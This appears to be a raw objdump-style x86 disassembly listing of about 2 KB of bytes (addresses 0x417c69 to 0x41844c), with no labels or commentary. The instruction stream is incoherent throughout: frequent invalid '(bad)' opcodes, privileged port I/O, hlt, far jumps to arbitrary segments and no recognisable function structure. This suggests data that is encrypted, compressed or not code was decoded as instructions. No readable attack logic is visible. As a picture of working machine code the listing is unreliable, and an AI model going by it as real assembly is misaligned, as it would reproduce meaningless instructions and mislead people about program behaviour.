  417c69:	aam    0x3f
  417c6b:	pushf  
  417c6c:	rcl    DWORD PTR [edx+eiz*8],cl
  417c6f:	fistp  QWORD PTR [esi+0x4e]
  417c72:	add    DWORD PTR [eax+0x28c4f675],edi
  417c78:	inc    ecx
  417c79:	pop    ss
  417c7a:	mov    al,0x0
  417c7c:	inc    edi
  417c7d:	dec    esp
  417c7e:	cmp    al,0xd6
  417c80:	sub    BYTE PTR [ebx-0x6388ed34],ch
  417c86:	retf   0xa2b
  417c89:	rcl    al,0xd0
  417c8c:	mov    al,ds:0x206e76ed
  417c91:	mov    dh,dh
  417c93:	lods   eax,DWORD PTR ds:[esi]
  417c94:	cld    
  417c95:	cwde   
  417c96:	push   0xc6e044bd
  417c9b:	les    edx,FWORD PTR [ecx]
  417c9d:	cli    
  417c9e:	out    dx,al
  417c9f:	(bad)  
  417ca0:	hlt    
  417ca1:	mul    DWORD PTR [ecx+0x29]
  417ca4:	push   eax
  417ca5:	push   es
  417ca6:	(bad)  [eiz*1+0x68ffe201]
  417cad:	jae    0x417cdb
  417caf:	push   ds
  417cb0:	mov    eax,0x44852531
  417cb5:	sbb    DWORD PTR ds:0xddad4d7c,esp
  417cbb:	push   0x60d774f8
  417cc0:	push   es
  417cc1:	pusha  
  417cc2:	aam    0x30
  417cc4:	shl    BYTE PTR [ebx-0x4061508],cl
  417cca:	pop    edi
  417ccb:	aas    
  417ccc:	sbb    DWORD PTR [eax-0x1b],0x12069f0c
  417cd3:	aad    0x2f
  417cd5:	sbb    eax,0xa0ec54c4
  417cda:	mov    dh,0x50
  417cdc:	adc    ecx,esi
  417cde:	shl    BYTE PTR [ebx],0x76
  417ce1:	mov    ah,0x92
  417ce3:	les    eax,FWORD PTR [edi-0x5e0681b5]
  417ce9:	enter  0x660b,0xbc
  417ced:	jmp    0xea16:0x419dc588
  417cf4:	cwde   
  417cf5:	lods   eax,DWORD PTR ds:[esi]
  417cf6:	dec    esi
  417cf7:	sub    ebx,DWORD PTR [eax]
  417cf9:	push   es
  417cfa:	xchg   DWORD PTR [edi-0x5b3761da],edi
  417d00:	int    0xdf
  417d02:	mov    eax,0x566387b0
  417d07:	lods   eax,DWORD PTR ds:[esi]
  417d08:	mov    ecx,0x397ad839
  417d0d:	jae    0x417cf8
  417d0f:	daa    
  417d10:	in     al,0xb9
  417d12:	dec    edi
  417d13:	test   BYTE PTR [edi-0x795924c6],ah
  417d19:	test   DWORD PTR [edx-0x62],ebx
  417d1c:	int3   
  417d1d:	pop    es
  417d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d1f:	push   edi
  417d20:	mov    bh,0xcf
  417d22:	addr16 addr16 cmp al,0x96
  417d26:	das    
  417d27:	mov    ds:0x791ff8e3,al
  417d2c:	or     BYTE PTR [bp+si],ch
  417d2f:	sub    esi,esp
  417d31:	int3   
  417d32:	pop    esi
  417d33:	aaa    
  417d34:	mov    ebx,0x1fdf4bd8
  417d39:	jnp    0x417cbb
  417d3b:	push   eax
  417d3c:	jo     0x417ccd
  417d3e:	jmp    0xbaf0fd37
  417d43:	hlt    
  417d44:	stos   DWORD PTR es:[edi],eax
  417d45:	jne    0x417cf1
  417d47:	dec    ebx
  417d48:	int    0x7d
  417d4a:	cwde   
  417d4b:	mov    bh,0x3f
  417d4d:	repz xor BYTE PTR [ebx+0x1d13b61b],cl
  417d54:	push   0xffffffd3
  417d56:	jl     0x417d2e
  417d58:	loope  0x417da8
  417d5a:	and    BYTE PTR [edx-0x6d],0x21
  417d5e:	jbe    0x417db7
  417d60:	call   ecx
  417d62:	ja     0x417d1a
  417d64:	cmc    
  417d65:	cmp    al,0x42
  417d67:	or     DWORD PTR [edx-0x53851706],edi
  417d6d:	popf   
  417d6e:	adc    bl,BYTE PTR [edi+esi*4+0x71f36a8b]
  417d75:	adc    DWORD PTR [esi+esi*8+0x5e],esi
  417d79:	jmp    0x417d86
  417d7b:	cwde   
  417d7c:	ret    
  417d7d:	ja     0x417d02
  417d7f:	push   ebx
  417d80:	cmp    al,0x5b
  417d82:	clc    
  417d83:	imul   ebp,DWORD PTR ds:0x8fb7633f,0xffffffdb
  417d8a:	cmp    esi,ebx
  417d8c:	shl    DWORD PTR [ebx-0x681d2cb1],cl
  417d92:	sub    bl,BYTE PTR [edx]
  417d94:	inc    edi
  417d95:	rcr    DWORD PTR [ebx],cl
  417d97:	and    DWORD PTR ds:0x20245a96,esi
  417d9d:	call   0xf6509aa7
  417da2:	cmp    bl,BYTE PTR [eax+0x36]
  417da5:	push   esp
  417da6:	out    0xa0,al
  417da8:	(bad)  
  417da9:	(bad)  
  417daa:	dec    esp
  417dab:	das    
  417dac:	xchg   ecx,eax
  417dad:	push   ss
  417dae:	fdivr  DWORD PTR [bx-0x73]
  417db2:	(bad)  
  417db3:	dec    esp
  417db4:	mov    esp,0x4b46166c
  417db9:	push   ebp
  417dba:	retf   
  417dbb:	push   edi
  417dbc:	iret   
  417dbd:	or     DWORD PTR [ecx+edi*4-0x4b],0x17
  417dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dc3:	loop   0x417d6f
  417dc5:	add    BYTE PTR [ebx-0x4992d00c],ah
  417dcb:	push   ebp
  417dcc:	int3   
  417dcd:	pop    edx
  417dce:	sbb    BYTE PTR [ebx+eax*8+0x69cc3ad8],0xe9
  417dd6:	jb     0x417df6
  417dd8:	imul   edx,DWORD PTR [edi],0x318b84f
  417dde:	xor    al,0x1e
  417de0:	inc    ecx
  417de1:	ror    DWORD PTR [eax+esi*2-0x6d],1
  417de5:	adc    BYTE PTR [ebx+0x1b3e84dd],dh
  417deb:	fidiv  DWORD PTR [eax+0x522865b1]
  417df1:	jbe    0x417ddc
  417df3:	and    al,0x9f
  417df5:	dec    ecx
  417df6:	inc    edi
  417df7:	jne    0x417dc2
  417df9:	popa   
  417dfa:	outs   dx,BYTE PTR ds:[esi]
  417dfb:	pop    ebp
  417dfc:	add    al,0x2
  417dfe:	mov    ecx,0x1c4c0c95
  417e03:	rcl    BYTE PTR [ebx+0x6cdb5478],1
  417e09:	sbb    eax,0x153960d9
  417e0e:	or     ebx,esp
  417e10:	and    DWORD PTR [ecx],edi
  417e12:	retf   
  417e13:	sahf   
  417e14:	outs   dx,DWORD PTR ds:[esi]
  417e15:	cli    
  417e16:	push   ds
  417e17:	les    ebp,FWORD PTR [eax-0x11028aa9]
  417e1d:	adc    eax,0x78f8cceb
  417e22:	loope  0x417e97
  417e24:	xchg   bl,bl
  417e26:	and    eax,0x9b943868
  417e2b:	shr    DWORD PTR [ecx+0x73],1
  417e2e:	jmp    0xbfd2:0xd600481c
  417e35:	push   ecx
  417e36:	lahf   
  417e37:	gs push edi
  417e39:	jl     0x417e74
  417e3b:	retf   
  417e3c:	mov    eax,ds:0xc5fd7e56
  417e41:	mov    WORD PTR [ecx-0x4b],ss
  417e44:	cmp    BYTE PTR [edi-0x4c],ah
  417e47:	mov    esi,gs
  417e49:	adc    dh,bh
  417e4b:	jne    0x417dee
  417e4d:	mov    al,0x3c
  417e4f:	pop    es
  417e50:	vrsqrtss xmm6,xmm6,DWORD PTR [ecx+0x5925db53]
  417e58:	or     dl,BYTE PTR [esi-0x5eb0e821]
  417e5e:	push   0xcea26f29
  417e63:	clc    
  417e64:	pusha  
  417e65:	pop    ebx
  417e66:	inc    esp
  417e67:	or     ebx,edi
  417e69:	xlat   BYTE PTR ds:[ebx]
  417e6a:	mov    al,ds:0x7c2952af
  417e6f:	imul   BYTE PTR [eax-0x6d]
  417e72:	out    dx,eax
  417e73:	aam    0x1f
  417e75:	mov    edx,0x733519e
  417e7a:	push   cs
  417e7b:	inc    ebx
  417e7c:	gs mov cl,0x14
  417e7f:	add    eax,0x2af2357d
  417e84:	and    ebp,ebx
  417e86:	popa   
  417e87:	and    edi,DWORD PTR [ebp+eiz*1-0x30]
  417e8b:	xchg   esi,eax
  417e8d:	dec    ah
  417e8f:	mov    ds:0x5aa24ee,eax
  417e94:	pusha  
  417e95:	adc    al,BYTE PTR [ecx]
  417e97:	sub    BYTE PTR [edi],dh
  417e99:	or     edx,DWORD PTR [edx+0x7d]
  417e9c:	jb     0x417e61
  417e9e:	call   0x8635642c
  417ea3:	and    al,0xd1
  417ea5:	sahf   
  417ea6:	fsubr  DWORD PTR [esi-0x79c9f889]
  417eac:	retf   0xf945
  417eaf:	inc    esp
  417eb0:	mov    esi,0x941b87f7
  417eb5:	pushf  
  417eb6:	mov    ecx,0x4ca1caa6
  417ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ebc:	je     0x417ef5
  417ebe:	sub    ecx,DWORD PTR [ecx]
  417ec0:	or     eax,0x1a8f6f47
  417ec5:	cmp    al,0x8
  417ec7:	sbb    dl,bh
  417ec9:	jo     0x417f26
  417ecb:	jnp    0x417e93
  417ecd:	cli    
  417ece:	xchg   esp,eax
  417ecf:	push   0x3694e716
  417ed4:	in     al,0x5e
  417ed6:	pop    eax
  417ed7:	mov    dh,BYTE PTR [ecx+0x6a]
  417eda:	dec    edx
  417edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417edc:	mulsd  xmm2,xmm0
  417ee0:	mov    dl,0x34
  417ee2:	lea    esp,[esi-0x66833f80]
  417ee8:	mov    edi,esi
  417eea:	mov    bh,0x88
  417eec:	outs   dx,BYTE PTR ds:[esi]
  417eed:	das    
  417eee:	mov    dh,0x6b
  417ef0:	call   0x68e964
  417ef5:	inc    eax
  417ef6:	push   edx
  417ef7:	nop
  417ef8:	mov    dh,BYTE PTR [esi+0x628e37e9]
  417efe:	out    dx,al
  417eff:	(bad)  
  417f00:	xlat   BYTE PTR ds:[ebx]
  417f01:	out    dx,al
  417f02:	imul   esi,DWORD PTR [ecx+eiz*4],0xae31f6a8
  417f09:	inc    eax
  417f0a:	jp     0x417f35
  417f0c:	mov    ah,0xaf
  417f0e:	xor    esp,edx
  417f10:	outs   dx,BYTE PTR ds:[esi]
  417f11:	dec    ecx
  417f12:	fidivr DWORD PTR [eax]
  417f14:	cld    
  417f15:	shr    BYTE PTR [ecx-0x56],cl
  417f18:	push   edi
  417f19:	call   0xf25d:0x1889f857
  417f20:	inc    esi
  417f21:	push   esp
  417f22:	mov    ebp,0xe5a33c3
  417f27:	fnsave [eax+0x2986c4ae]
  417f2d:	cmp    al,0x9c
  417f2f:	popa   
  417f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f31:	jmp    0x2752:0x18408085
  417f38:	jp     0x417f21
  417f3a:	mov    ebp,0x6b895700
  417f3f:	or     al,0x26
  417f41:	fs mov ah,0x7c
  417f44:	mov    ds:0xe2fcaa2d,al
  417f49:	sub    BYTE PTR [edi],0xbe
  417f4c:	(bad)  [ebx-0x532db62c]
  417f52:	lods   al,BYTE PTR ds:[esi]
  417f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f54:	xchg   ecx,eax
  417f55:	stos   BYTE PTR es:[edi],al
  417f56:	lds    ebx,FWORD PTR [esi+0x29]
  417f59:	and    al,0x2d
  417f5b:	fsub   QWORD PTR [edi+0x6]
  417f5e:	mov    DWORD PTR [ebx+0x69],eax
  417f61:	adc    bl,al
  417f63:	ror    bl,cl
  417f65:	mov    ah,0x99
  417f67:	in     eax,0x1f
  417f69:	sub    eax,0xf3e72da6
  417f6e:	bound  esi,QWORD PTR [edi+esi*1-0x10]
  417f72:	mov    ecx,0xe0fdaac2
  417f77:	mov    al,ds:0x24ce0129
  417f7c:	adc    ecx,DWORD PTR [ebp-0x24cce8b2]
  417f82:	cld    
  417f83:	dec    ebx
  417f84:	sbb    BYTE PTR [edx],al
  417f86:	pop    es
  417f87:	push   0xffffff8c
  417f89:	jb     0x417f3c
  417f8b:	jg     0x417f91
  417f8d:	pop    esi
  417f8e:	add    al,0xde
  417f90:	xor    al,0x59
  417f92:	icebp  
  417f93:	add    ebx,DWORD PTR [edi-0x2]
  417f96:	test   al,0xa5
  417f98:	or     edi,DWORD PTR [eax]
  417f9a:	sbb    bh,BYTE PTR [esi-0x12]
  417f9d:	push   ds
  417f9e:	rcr    eax,1
  417fa0:	ss or  ch,cl
  417fa3:	add    ebx,DWORD PTR [eax+ebp*8-0x2f066bee]
  417faa:	push   edx
  417fab:	pop    ebx
  417fac:	pushf  
  417fad:	pop    esi
  417fae:	cmp    al,0x14
  417fb0:	fwait
  417fb1:	test   al,0xa5
  417fb3:	inc    ecx
  417fb4:	(bad)  
  417fb5:	pop    ecx
  417fb6:	ret    0xe7ca
  417fb9:	add    DWORD PTR [ebx],esi
  417fbb:	scas   al,BYTE PTR es:[edi]
  417fbc:	adc    BYTE PTR [eax+0x14],dh
  417fbf:	xchg   esp,eax
  417fc0:	xchg   ebp,eax
  417fc1:	push   cs
  417fc2:	loopne 0x417f97
  417fc4:	loope  0x418034
  417fc6:	adc    ebp,DWORD PTR [edx+0x586c3971]
  417fcc:	call   0xec00:0x785c0da9
  417fd3:	(bad)  
  417fd4:	js     0x417ff4
  417fd6:	sahf   
  417fd7:	pop    esi
  417fd8:	inc    ebp
  417fd9:	push   0xffffffd7
  417fdb:	ret    
  417fdc:	cmp    al,0x4b
  417fde:	popf   
  417fdf:	adc    BYTE PTR [ebp+ebx*1+0x664633c6],ah
  417fe6:	pop    ds
  417fe7:	ror    dh,1
  417fe9:	or     BYTE PTR [ebp+edi*4+0x44],bh
  417fed:	dec    edi
  417fee:	sbb    al,0x6f
  417ff0:	sub    DWORD PTR [ecx+0x44],esp
  417ff3:	in     al,0xe2
  417ff5:	out    dx,eax
  417ff6:	pop    ebx
  417ff7:	xor    al,BYTE PTR [edx+0xd]
  417ffa:	dec    edx
  417ffb:	push   ecx
  417ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffd:	and    ecx,ecx
  417fff:	cld    
  418000:	cdq    
  418001:	xor    al,0xe5
  418003:	xor    eax,DWORD PTR [edx]
  418005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418006:	pop    ebp
  418007:	or     ebp,DWORD PTR [edx-0x4a895e83]
  41800d:	xchg   edx,eax
  41800e:	sub    edi,ecx
  418010:	mov    DWORD PTR [eax+0x49],edi
  418013:	and    ecx,DWORD PTR [edi-0x9263a00]
  418019:	inc    edx
  41801a:	das    
  41801b:	and    bh,bl
  41801d:	jnp    0x417ff9
  41801f:	fisttp QWORD PTR ds:0x4dbea864
  418025:	and    bl,0x26
  418028:	cmp    eax,0xb9ba589
  41802d:	or     al,0xaa
  41802f:	mov    eax,0xe42fff9e
  418034:	test   DWORD PTR [eax+esi*8-0x2ace926f],ecx
  41803b:	pop    ss
  41803c:	xchg   ebx,eax
  41803d:	(bad)  
  41803e:	jecxz  0x418052
  418040:	in     al,dx
  418041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418042:	push   ebx
  418043:	in     al,dx
  418044:	adc    eax,0x13e60aab
  418049:	jecxz  0x4180c4
  41804b:	mov    eax,0x7ab1e764
  418050:	sub    ecx,DWORD PTR [esi-0x80]
  418053:	lods   eax,DWORD PTR ds:[esi]
  418054:	xlat   BYTE PTR ds:[ebx]
  418055:	in     al,0xf6
  418057:	mov    ecx,0x903baf41
  41805c:	loopne 0x4180c6
  41805e:	xchg   edi,eax
  41805f:	xchg   edx,eax
  418060:	into   
  418061:	add    eax,0xa1568755
  418066:	or     al,0x68
  418068:	jne    0x418016
  41806a:	adc    al,dh
  41806c:	mov    eax,ds:0xcfe1ef56
  418071:	push   0xe57b4610
  418076:	pushf  
  418077:	mov    bl,0xb5
  418079:	lods   al,BYTE PTR ds:[esi]
  41807a:	xchg   esp,eax
  41807b:	sti    
  41807c:	sbb    ch,al
  41807e:	or     al,0xb1
  418080:	adc    DWORD PTR [eax+0x6eac9ec8],eax
  418086:	xor    DWORD PTR [ebx],esp
  418088:	bound  esi,QWORD PTR [esi]
  41808a:	dec    edx
  41808b:	sbb    BYTE PTR [ecx],dh
  41808d:	sar    BYTE PTR [eax],1
  41808f:	cmp    BYTE PTR [eax-0x9d76957],al
  418095:	pop    edx
  418096:	loop   0x41808d
  418098:	daa    
  418099:	sar    BYTE PTR [ecx],1
  41809b:	adc    ch,BYTE PTR [ebx+0xe]
  41809e:	fimul  WORD PTR [esi+0x4ce0249]
  4180a4:	mov    edx,0xe5828ec8
  4180a9:	test   eax,0xdd55d4be
  4180ae:	mov    eax,ds:0xa6ab70f0
  4180b3:	pop    edi
  4180b4:	int    0x39
  4180b6:	pushf  
  4180b7:	call   0x2c49:0xa5ad6952
  4180be:	(bad)  
  4180bf:	mov    edx,0x2da061
  4180c4:	jae    0x4180e1
  4180c6:	push   ebx
  4180c7:	mov    edi,0x303a0cfc
  4180cc:	lock lahf 
  4180ce:	fs xchg ebx,eax
  4180d0:	loopne 0x41808f
  4180d2:	scas   eax,DWORD PTR es:[edi]
  4180d3:	mov    ds:0x87d47885,eax
  4180d8:	dec    eax
  4180d9:	mov    fs,WORD PTR [esi-0x2f]
  4180dc:	(bad)  
  4180dd:	mov    ebp,edx
  4180df:	dec    edx
  4180e0:	add    DWORD PTR [ebx],ebx
  4180e2:	pop    esi
  4180e3:	and    esp,ecx
  4180e5:	leave  
  4180e6:	sahf   
  4180e7:	out    dx,eax
  4180e8:	or     ecx,ebx
  4180ea:	iret   
  4180eb:	and    eax,0x84e24eed
  4180f0:	cld    
  4180f1:	mov    eax,ds:0x34a1f42c
  4180f6:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4180f8:	pop    ecx
  4180f9:	inc    edx
  4180fa:	sar    ch,1
  4180fc:	xor    ch,ch
  4180fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ff:	adc    bl,BYTE PTR [esi+0x50]
  418102:	mov    edx,0xe32a3f41
  418107:	push   edx
  418108:	mov    dl,0x8d
  41810a:	test   ebx,esp
  41810c:	jns    0x4180af
  41810e:	imul   ebx,DWORD PTR [ecx],0x7
  418111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418112:	cmp    eax,0x5e88517c
  418117:	inc    edi
  418118:	inc    esp
  418119:	dec    ebx
  41811a:	(bad)  
  41811b:	stos   BYTE PTR es:[edi],al
  41811c:	add    BYTE PTR [esi-0x36],bl
  41811f:	int    0xd6
  418121:	mov    eax,0x79d13d88
  418126:	adc    DWORD PTR [esi],edi
  418128:	bound  eax,QWORD PTR [ecx-0x5c]
  41812b:	repnz (bad) 
  41812d:	jne    0x418146
  41812f:	dec    ecx
  418130:	clc    
  418131:	ja     0x418158
  418133:	add    al,0x29
  418135:	bound  edi,QWORD PTR [ebx-0x7c0eaa09]
  41813b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41813c:	shl    ebx,0xd2
  41813f:	lods   al,BYTE PTR ds:[esi]
  418140:	mov    esi,0x7d24170f
  418145:	mov    ds:0x6d0c0d59,eax
  41814a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41814b:	or     al,BYTE PTR [ebx]
  41814d:	sub    ecx,eax
  41814f:	mov    dl,0xa0
  418151:	xor    BYTE PTR ds:0xf196c175,0x56
  418158:	add    eax,0xf1a6cbe2
  41815d:	or     ah,BYTE PTR [ecx]
  41815f:	jns    0x4181dc
  418161:	clc    
  418162:	in     al,0x8b
  418164:	jg     0x418104
  418166:	or     eax,0x577912e2
  41816b:	xchg   BYTE PTR [edx-0xdada6e1],bl
  418171:	mov    eax,esi
  418173:	in     eax,0x9e
  418175:	rcl    DWORD PTR [ecx-0x4f027f00],0xff
  41817c:	pop    ds
  41817d:	xchg   ebx,eax
  41817e:	test   DWORD PTR [edi-0x5a694f82],0x27a3759e
  418188:	mov    esp,0xcd43e172
  41818d:	stc    
  41818e:	sbb    BYTE PTR [esi-0x66359986],ah
  418194:	(bad)  
  418195:	and    BYTE PTR [ecx-0x25],bl
  418198:	sub    DWORD PTR [ecx],0xc6998398
  41819e:	and    esp,DWORD PTR [edx-0x12]
  4181a1:	jmp    0x9c7b31ba
  4181a6:	sub    DWORD PTR [ebx+0x7c],edx
  4181a9:	sbb    ebp,esp
  4181ab:	test   DWORD PTR [edi],ebx
  4181ad:	jnp    0x4181d8
  4181af:	sub    BYTE PTR [edi-0x4fe10228],al
  4181b5:	and    BYTE PTR [edi+ebx*2+0x2b],0x8a
  4181ba:	mov    bl,BYTE PTR [esi+0x6f536b7f]
  4181c0:	sbb    eax,0xea5d9621
  4181c5:	(bad)  
  4181c6:	in     al,dx
  4181c7:	jl     0x41820d
  4181c9:	sbb    BYTE PTR [esi-0x168a2ee5],bl
  4181cf:	xor    esp,DWORD PTR [ebp-0x411ab4f3]
  4181d5:	and    eax,0x3dc46e10
  4181da:	or     bh,BYTE PTR [ebx+ebx*1]
  4181dd:	inc    ecx
  4181de:	sti    
  4181df:	scas   al,BYTE PTR es:[edi]
  4181e0:	add    al,0x9c
  4181e2:	retf   0xe928
  4181e5:	fidiv  WORD PTR [esp+ebp*2-0x1df6e81b]
  4181ec:	scas   eax,DWORD PTR es:[edi]
  4181ed:	pop    ecx
  4181ee:	mov    edx,0x25857dbe
  4181f3:	push   ss
  4181f4:	outs   dx,DWORD PTR ds:[esi]
  4181f5:	dec    esp
  4181f6:	ss rcr ebx,1
  4181f9:	or     ecx,edx
  4181fb:	ja     0x4181e5
  4181fd:	dec    esi
  4181fe:	xor    eax,0x53e1d94a
  418203:	inc    ebx
  418204:	inc    ecx
  418205:	add    bh,BYTE PTR [edi+ebx*4]
  418208:	cdq    
  418209:	push   ebx
  41820a:	fsub   QWORD PTR [edi+eax*1-0x1ec25ff4]
  418211:	xchg   ebx,eax
  418212:	dec    esp
  418213:	push   edx
  418214:	dec    DWORD PTR gs:[eax+0x72]
  418218:	nop
  418219:	cld    
  41821a:	inc    ebx
  41821b:	push   esp
  41821c:	and    BYTE PTR [edx-0x61],bh
  41821f:	aad    0xc5
  418221:	jo     0x418225
  418223:	enter  0xc356,0x26
  418227:	aam    0xa3
  418229:	cli    
  41822a:	jg     0x418210
  41822c:	das    
  41822d:	inc    ecx
  41822e:	int3   
  41822f:	mov    BYTE PTR [ebp-0x4e],cl
  418232:	or     al,ah
  418234:	retf   0x5301
  418237:	sub    DWORD PTR [ecx+edi*8+0x40204d56],0xffffffee
  41823f:	fistp  DWORD PTR [edx-0x61]
  418242:	icebp  
  418243:	cli    
  418244:	cwde   
  418245:	std    
  418246:	cmp    DWORD PTR [ebp+0x3d],0x94a4b0d3
  41824d:	push   eax
  41824e:	shr    BYTE PTR [edi],1
  418250:	fstp   TBYTE PTR [esp+ebx*4]
  418253:	xor    ah,BYTE PTR [ecx+0x1b]
  418256:	ror    al,cl
  418258:	mov    ch,0x21
  41825a:	cmp    eax,0x8ee24edc
  41825f:	mov    al,ds:0xaab18a8
  418264:	in     al,0x1a
  418266:	inc    ecx
  418267:	inc    ebx
  418268:	stos   BYTE PTR es:[edi],al
  418269:	loop   0x418291
  41826b:	rcr    esi,1
  41826d:	inc    ebp
  41826e:	addr16 aam 0x2f
  418271:	shr    ah,cl
  418273:	lods   al,BYTE PTR ds:[esi]
  418274:	mov    esi,0xb8db64b1
  418279:	sub    al,0x54
  41827b:	or     ecx,ecx
  41827d:	cs adc al,0x9
  418280:	outs   dx,BYTE PTR ds:[esi]
  418281:	ja     0x418288
  418283:	mov    bl,0xae
  418285:	push   ss
  418286:	xlat   BYTE PTR ds:[ebx]
  418287:	retf   0x99d2
  41828a:	and    eax,0xbe1f5dae
  41828f:	lock ins DWORD PTR es:[edi],dx
  418291:	sbb    DWORD PTR [ebp-0xa511899],edx
  418297:	cmp    DWORD PTR [ebp+eax*8+0x4ff66d3e],ecx
  41829e:	fadd   DWORD PTR [ecx+eax*4]
  4182a1:	fist   WORD PTR [si]
  4182a4:	mov    bh,0xaf
  4182a6:	fs xchg ecx,eax
  4182a8:	test   eax,0x63b8fea4
  4182ad:	stos   DWORD PTR es:[edi],eax
  4182ae:	ss repnz cmc 
  4182b1:	imul   ebx,esi,0x53
  4182b4:	push   es
  4182b5:	cmp    edx,DWORD PTR [ecx-0xf35365c]
  4182bb:	lea    ebx,[esi+0x69]
  4182be:	jnp    0x4182ad
  4182c0:	fcmovbe st,st(1)
  4182c2:	adc    DWORD PTR [edi+edx*4+0x2b947ed5],ebx
  4182c9:	mov    ecx,0x967af84e
  4182ce:	adc    bl,dl
  4182d0:	ja     0x4182bc
  4182d2:	jo     0x418347
  4182d4:	and    cl,BYTE PTR [ecx+0x58a5821a]
  4182da:	fwait
  4182db:	or     ecx,ebx
  4182dd:	in     al,dx
  4182de:	leave  
  4182df:	loopne 0x4182fc
  4182e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182e2:	adc    al,0x1f
  4182e4:	add    eax,0xe4024bc9
  4182e9:	cmp    ecx,edi
  4182eb:	fwait
  4182ec:	push   edx
  4182ed:	mov    ah,0x5f
  4182ef:	inc    ebp
  4182f0:	fldl2e 
  4182f2:	push   esi
  4182f3:	add    al,0xb7
  4182f5:	sti    
  4182f6:	jp     0x41827c
  4182f8:	add    al,0xb6
  4182fa:	jecxz  0x418284
  4182fc:	jno    0x41829a
  4182fe:	pushf  
  4182ff:	xor    ecx,edx
  418301:	jno    0x41828c
  418303:	iret   
  418304:	arpl   cx,bx
  418306:	loopne 0x41832a
  418308:	add    al,BYTE PTR [eax-0x65]
  41830b:	xchg   esi,eax
  41830c:	adc    al,0x15
  41830e:	bnd ret 0x450e
  418312:	inc    esi
  418313:	out    dx,eax
  418314:	aam    0x8a
  418316:	push   edx
  418317:	and    BYTE PTR [edi+0xccacec2],ah
  41831d:	sub    DWORD PTR [ebx+0x6360eb3b],esp
  418323:	sahf   
  418324:	xchg   BYTE PTR [edx+0x3ddd167c],bl
  41832a:	in     al,dx
  41832b:	shr    BYTE PTR [ecx+0x7c],cl
  41832e:	sbb    dl,bh
  418330:	hlt    
  418331:	jecxz  0x41830e
  418333:	sub    DWORD PTR [ebp+0x53],edx
  418336:	or     ecx,DWORD PTR [edi-0x49]
  418339:	jmp    0xd2fa:0xcb365ab4
  418340:	jmp    0xf30f:0x4a30ae02
  418347:	add    edi,DWORD PTR [ecx+ecx*4+0x35]
  41834b:	clc    
  41834c:	popa   
  41834d:	jne    0x418323
  41834f:	(bad)  
  418350:	jp     0x418329
  418352:	add    ecx,DWORD PTR [edi-0x66cdbef9]
  418358:	test   al,0x43
  41835a:	fnstcw WORD PTR [ecx+0x17d3c52a]
  418360:	sbb    dh,BYTE PTR [ecx+0x24]
  418363:	and    al,0x4d
  418365:	enter  0xfd7c,0x73
  418369:	xor    edi,DWORD PTR [ecx]
  41836b:	xor    BYTE PTR ds:0x40c84275,0x54
  418372:	les    dx,DWORD PTR ds:[ebp+0x16dc1028]
  41837a:	in     al,0xae
  41837c:	gs es cld 
  41837f:	pop    eax
  418380:	push   ebx
  418381:	call   0x1973:0xe2ab84bf
  418388:	aam    0x66
  41838a:	xor    BYTE PTR [esi+esi*1-0x36],cl
  41838e:	cmp    BYTE PTR [ebx],ch
  418390:	adc    BYTE PTR [ecx-0x179b0dfe],bl
  418396:	in     al,dx
  418397:	jbe    0x418388
  418399:	aaa    
  41839a:	out    0xa,eax
  41839c:	cmp    ecx,DWORD PTR [esp+ebp*2-0x478ebd54]
  4183a3:	add    eax,0x1038facc
  4183a8:	mov    ds:0xa44af6f2,al
  4183ad:	mov    WORD PTR [esi+0xe],ss
  4183b0:	mov    edi,edi
  4183b2:	cdq    
  4183b3:	push   ebp
  4183b4:	xor    BYTE PTR [ecx+0x32],dh
  4183b7:	push   es
  4183b8:	add    ebp,DWORD PTR [esi+edi*8-0x4f]
  4183bc:	jnp    0x4183a9
  4183be:	jmp    0xeaf8:0x899c27ff
  4183c5:	neg    edi
  4183c7:	cdq    
  4183c8:	(bad)  
  4183c9:	out    0xc8,al
  4183cb:	leave  
  4183cc:	inc    esp
  4183cd:	popf   
  4183ce:	xchg   esi,eax
  4183cf:	inc    esi
  4183d0:	std    
  4183d1:	scas   al,BYTE PTR es:[edi]
  4183d2:	xchg   ah,ch
  4183d4:	fistp  QWORD PTR [ecx+0x4693e3b]
  4183da:	fdivr  DWORD PTR [ebp-0xaeb5964]
  4183e0:	adc    eax,0x272bcfc1
  4183e5:	mov    bh,BYTE PTR [ecx-0x3b8f93ea]
  4183eb:	iret   
  4183ec:	fbld   TBYTE PTR [eax+0x5e]
  4183ef:	out    0xcb,al
  4183f1:	dec    DWORD PTR [edi]
  4183f3:	xchg   edx,eax
  4183f4:	lahf   
  4183f5:	dec    ecx
  4183f6:	imul   ebx,DWORD PTR [eax],0xffffffb9
  4183f9:	loopne 0x41845d
  4183fb:	es jbe 0x418442
  4183fe:	cli    
  4183ff:	or     bl,cl
  418401:	nop
  418402:	sub    BYTE PTR [edi-0x7b],ch
  418405:	mov    ebx,0x5093267c
  41840a:	js     0x4183fa
  41840c:	push   ebx
  41840d:	jbe    0x4183bc
  41840f:	repnz (bad) 
  418411:	mov    esi,0x2bf6d78a
  418416:	pusha  
  418417:	and    eax,0xe119462c
  41841c:	mov    ecx,0x139af36d
  418421:	loop   0x418402
  418423:	mov    ebp,DWORD PTR [eax]
  418425:	add    BYTE PTR [esi],bh
  418427:	mov    esp,0x3bd6c577
  41842c:	dec    esp
  41842d:	jns    0x4183d4
  41842f:	xor    eax,0x8126e6a8
  418434:	inc    esp
  418435:	sub    DWORD PTR [eax],ecx
  418437:	int    0x9d
  418439:	cmp    DWORD PTR [ebx],ebp
  41843b:	sbb    eax,esi
  41843d:	xchg   BYTE PTR [esi+0x65844e97],dl
  418443:	out    0x9b,al
  418445:	mov    al,ds:0xeb5605cb
  41844a:	mov    ch,0x99
  41844c:	jno    0x418404
